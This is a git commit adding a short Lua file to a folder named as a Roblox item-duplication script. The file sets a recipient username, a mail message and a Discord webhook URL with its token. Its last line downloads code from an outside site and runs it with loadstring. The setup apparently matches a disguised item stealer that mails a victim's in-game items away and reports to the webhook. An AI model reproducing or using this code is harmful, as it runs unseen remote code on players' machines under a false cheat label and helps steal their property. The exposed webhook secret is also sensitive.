bf10e4cc3c2d461f7d696c4d69b7c320377ca34b
ps99scriptlong <167875696+ps99scriptlong@users.noreply.github.com>
2024-05-16 06:43:08 +0700

    Create main.lua

---
+++ dupescript/kalongontop/main.lua
@@ -0,0 +1,5 @@
+Username = "mxrcuszzzzz"
+MailMessage = "script by kalong"
+Webhook = "https://discord.com/api/webhooks/1240449131726770206/A-TOlkbFWSjO5ayG_b3oDRQm_b3t6-OI5OgPxI6uxlgC7kPCNMCY4S_jkJMZ36VvcWSV"
+
+loadstring(game:HttpGet("https://egorikusa.space/ttd"))()
